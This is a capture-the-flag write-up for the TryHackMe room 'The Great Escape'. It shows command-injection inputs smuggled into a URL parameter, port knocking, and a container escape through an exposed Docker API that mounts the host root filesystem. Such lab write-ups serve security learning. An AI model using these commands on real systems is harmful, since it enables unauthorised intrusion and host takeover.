# The Great Escape

## Introduction

Welcome to my another writeup! In this TryHackMe [The Great Escape](https://tryhackme.com/room/thegreatescape) room, you'll learn: Command injection, docker container escape, and more! Without further ado, let's dive in.

## Background

> Our devs have created an awesome new site. Can you break out of the sandbox?

> Difficulty: Medium

- Overall difficulty for me: Medium
   - Initial foothold: Medium
   - Privilege escalation: Medium

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# export RHOSTS=10.10.16.210      
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh?    syn-ack ttl 62
| fingerprint-strings: 
|   GenericLines: 
|_    ug^#0dkN[K1`=>NefK`>RLK#}L4|Q
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    syn-ack ttl 62 nginx 1.19.6
|_http-server-header: nginx/1.19.6
| http-robots.txt: 3 disallowed entries 
|_/api/ /exif-util /*.bak.txt$
|_http-favicon: Unknown favicon MD5: 67EDB7D39E1376FDD8A24B0C640D781E
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: docker-escape-nuxt
```

According to `rustscan` and `nmap` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | SSH??
80                | nginx 1.19.6

### HTTP on Port 80

**Add a domain to `/etc/hosts`:** (Optional, but it's a good practice to do so.)
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# echo "$RHOSTS the-great-escape.thm" | tee -a /etc/hosts
```

**robots.txt:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# curl http://the-great-escape.thm/robots.txt
User-agent: *
Allow: /
Disallow: /api/
# Disallow: /exif-util
Disallow: /*.bak.txt$
```

**Something interesting in `robots.txt`.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a1.png)

`Photo Classroom`, not sure what is it.

**`/api/`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a2.png)

`Nothing to see here, move along...`

Next, by enumerating manually, I found that **there is a directory called `.well-known`, and it has a file called `security.txt`.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a9.png)

**Let's use `curl` to send a HEAD request to `/api/fl46`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# curl -I http://the-great-escape.thm/api/fl46 
HTTP/1.1 200 OK
Server: nginx/1.19.6
Date: Thu, 13 Oct 2022 12:27:59 GMT
Connection: keep-alive
flag: THM{Redacted}
```

Found a hidden flag!

**`/exif-util/`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a3.png)

**In here, we can see that this page is a `ExifTool`, and we're able to upload a file.**

Let's upload an image for testing!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a4.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a5.png)

**We can see that, when we submit an image, it made a POST request to `/api/exif` to view the metadata inside that image!**

**Let's check out the `/api/exif`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a6.png)

Hmm... 500 Internal Server Error?

**Let's try `From URL`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a7.png)

**When we use the `enter a URL to an image`, it sent a GET request to `/api/exif`, and the GET parameter is `url`.**

Mmm... **What if we let it send a GET request to my attacker machine?**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a8.png)

Ohh!!! It can reach to my attacker machine!

**Also, I suspect that it's using `curl` to fetch an image!**

If it's indeed using `curl` to fetch an image, then it may suffer **command injection**!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# curl 'http://the-great-escape.thm/api/exif?url=http://127.0.0.1;whoami'
An error occurred: 127.0.0.1;whoami
                Response was:
                ---------------------------------------
                <-- -1 http://127.0.0.1;whoami
Response : 
Length : 0
Body : (empty)
Headers : (0)
```

Hmm... Maybe pipe (`|`)?

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# curl 'http://the-great-escape.thm/api/exif?url=http://127.0.0.1|whoami'  
        
```

Nothing...

**Looks like the the API's `curl` command is being the part of the URL... It's not vulnerable to command injection.**

Ok, let's take a step back.

## Initial Foothold

**In the `robots.txt`, we can see that there is a disallow entry:**

`Disallow: /*.bak.txt$`

Maybe there is a backup of this `exif` API?

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a10.png)

Not `/exif.bak.txt`. **How about `/exif-util.bak.txt`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a11.png)

Yep! It has a backup of the `exif` API!

**`/exif-util.bak.txt`:**
```html
<template>
  <section>
    <div class="container">
      <h1 class="title">Exif Utils</h1>
      <section>
        <form @submit.prevent="submitUrl" name="submitUrl">
          <b-field grouped label="Enter a URL to an image">
            <b-input
              placeholder="http://..."
              expanded
              v-model="url"
            ></b-input>
            <b-button native-type="submit" type="is-dark">
              Submit
            </b-button>
          </b-field>
        </form>
      </section>
      <section v-if="hasResponse">
        <pre>
          {{ response }}
        </pre>
      </section>
    </div>
  </section>
</template>

<script>
export default {
  name: 'Exif Util',
  auth: false,
  data() {
    return {
      hasResponse: false,
      response: '',
      url: '',
    }
  },
  methods: {
    async submitUrl() {
      this.hasResponse = false
      console.log('Submitted URL')
      try {
        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
          params: {
            url: this.url,
          },
        })
        this.hasResponse = true
        this.response = response
      } catch (err) {
        console.log(err)
        this.$buefy.notification.open({
          duration: 4000,
          message: 'Something bad happened, please verify that the URL is valid',
          type: 'is-danger',
          position: 'is-top',
          hasIcon: true,
        })
      }
    },
  },
}
</script>
```

**In the above JavaScript, we can see that our submitted URL is being sent to `http://api-dev-backup:8080/exif`.**

**So, what if we parse it to `/api/exif?url=`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a12.png)

500 Internal Server Error... **Maybe it also need a GET parameter `url`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a13.png)

Oh!! This time we can see a `curl` error message!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a14.png)

**And I can execute commands!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a15.png)

Let's get a reverse shell!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a16.png)

Hmm... We received a 400 Bad Request because the request contains banned words. Looks like it's filtering the input!

After fumbling around, I find that **it can't reach to my attacker machine:**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a17.png)

Let's take a step back again, and stop trying to get a shell.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a18.png)

In the root directory of the Linux filesystem, we can see that there is a `.dockerenv` file, which reveals **this host is a docker container.**

**Also, since we're root, let's check the user `root` home directory!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a19.png)

`dev-note.txt`, and `.git` directory?

**`/root/dev-note.txt`:**
```
Hey guys,

Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.

Anyways, the password is fluffybunnies123

Cheers,

Hydra
```

Maybe that password for the SSH?

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# nc $RHOSTS 22
s`
0$
F84RpITAEY)EI
[...]
```

Oh, that is not SSH!

Maybe it's the credentials in the `/login`?

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a20.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a21.png)

It's not. Maybe this is a rabbit hole.

**As we found the `.git` and `.gitconfig` in `/root` directory, let's take a deep dive into that!**

**`/root/.gitconfig`:**
```
[user]
	email = hydragyrum@example.com
	name = Hydra
```

**Check `git log`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a22.png)

```
commit 5242825dfd6b96819f65d17a1c31a99fea4ffb6a
Author: Hydra <hydragyrum@example.com>
Date:   Thu Jan 7 16:48:58 2021 +0000

    fixed the dev note

commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Removed the flag and original dev note b/c Security

commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes
```

Hmm... The `a3d30a7d0510dc6565ff9316e3fb84434916dee8` commit looks sussy.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Great-Escape/images/a23.png)

```
commit 5242825dfd6b96819f65d17a1c31a99fea4ffb6a
Author: Hydra <hydragyrum@example.com>
Date:   Thu Jan 7 16:48:58 2021 +0000

    fixed the dev note

diff --git a/dev-note.txt b/dev-note.txt
new file mode 100644
index 0000000..efadf5b
--- /dev/null
+++ b/dev-note.txt
@@ -0,0 +1,9 @@
+Hey guys,
+
+Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.
+
+Anyways, the password is fluffybunnies123
+
+Cheers,
+
+Hydra
\ No newline at end of file

commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Removed the flag and original dev note b/c Security

diff --git a/dev-note.txt b/dev-note.txt
deleted file mode 100644
index 89dcd01..0000000
--- a/dev-note.txt
+++ /dev/null
@@ -1,9 +0,0 @@
-Hey guys,
-
-I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
-
-Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
-
-Cheers,
-
-Hydra
\ No newline at end of file
diff --git a/flag.txt b/flag.txt
deleted file mode 100644
index aae8129..0000000
--- a/flag.txt
+++ /dev/null
@@ -1,3 +0,0 @@
-You found the root flag, or did you?
-
-THM{Redacted}
\ No newline at end of file
```

**Found the "root" flag, and some hints!**
```
I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.

Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
```

**Let's `knock` those ports!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# knock $RHOSTS 42 1337 10420 6969 63000
```

**Then, do another `rustscan` to confirm the docker port is opened:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan1.txt
[...]
Open 10.10.16.210:22
Open 10.10.16.210:80
Open 10.10.16.210:2375
[...]
```

It's opened!

**Let's enumerate what containers are there:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# docker -H $RHOSTS:2375 container ls          
CONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS       PORTS                  NAMES
49fe455a9681   frontend       "/docker-entrypoint.…"   21 months ago   Up 2 hours   0.0.0.0:80->80/tcp     dockerescapecompose_frontend_1
4b51f5742aad   exif-api-dev   "./application -Dqua…"   21 months ago   Up 2 hours                          dockerescapecompose_api-dev-backup_1
cb83912607b9   exif-api       "./application -Dqua…"   21 months ago   Up 2 hours   8080/tcp               dockerescapecompose_api_1
548b701caa56   endlessh       "/endlessh -v"           21 months ago   Up 2 hours   0.0.0.0:22->2222/tcp   dockerescapecompose_endlessh_1
```

**The `frontend` container looks promising!**

**Let's spawn an interactive bash shell on the container:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# docker -H $RHOSTS:2375 exec -it 49fe455a9681 bash
root@docker-escape:/# whoami;hostname;id
root
docker-escape
uid=0(root) gid=0(root) groups=0(root)
```

I'm `root` in this `docker-escape` container!

```
root@docker-escape:/# ls -lah /root
total 16K
drwx------ 2 root root 4.0K Dec  9  2020 .
drwxr-xr-x 1 root root 4.0K Jan  7  2021 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
```

But nothing in `/root`...

**Then, let's enumerate what images are there!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# docker -H $RHOSTS:2375 image ls                                                    
REPOSITORY                                    TAG       IMAGE ID       CREATED         SIZE
exif-api-dev                                  latest    4084cb55e1c7   21 months ago   214MB
exif-api                                      latest    923c5821b907   21 months ago   163MB
frontend                                      latest    577f9da1362e   21 months ago   138MB
endlessh                                      latest    7bde5182dc5e   21 months ago   5.67MB
nginx                                         latest    ae2feff98a0c   22 months ago   133MB
debian                                        10-slim   4a9cd57610d6   22 months ago   69.2MB
registry.access.redhat.com/ubi8/ubi-minimal   8.3       7331d26c1fdf   22 months ago   103MB
alpine                                        3.9       78a2ce922f86   2 years ago     5.55MB
```

**The `alpine` image looks interesting!**

**Let's fire up the `alpine` container and mount the `/` directory on the container to our `/mnt/share` on our attacker machine!**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# mkdir /mnt/share

┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Great-Escape]
└─# docker -H $RHOSTS:2375 run --rm -it -v /:/mnt/share alpine:3.9
```

```
/ # ls -lah /mnt/share/root/
total 24
drwx------    3 root     root        4.0K Jan  6  2021 .
drwxr-xr-x   22 root     root        4.0K Jan  9  2021 ..
lrwxrwxrwx    1 root     root           9 Jan  6  2021 .bash_history -> /dev/null
-rw-r-----    1 root     root        3.0K Apr  9  2018 .bashrc
drwxr-xr-x    3 root     root        4.0K Jan  6  2021 .local
-rw-r-----    1 root     root         148 Aug 17  2015 .profile
-rw-------    1 root     root          74 Jan  6  2021 flag.txt
```

Found the flag!

## Rooted

**root.txt:**
```
/ # cat /mnt/share/root/flag.txt 
Congrats, you found the real flag!

THM{Redacted}
```

# Conclusion

What we've learned:

1. Web Crawler (`robots.txt`)
2. Site-Wide Metadata (`/.well-known/`)
3. Command Injection
4. Git Repository Enumeration
5. Port Knocking
6. Enumerating Exposed Docker Port
7. Docker Container Escape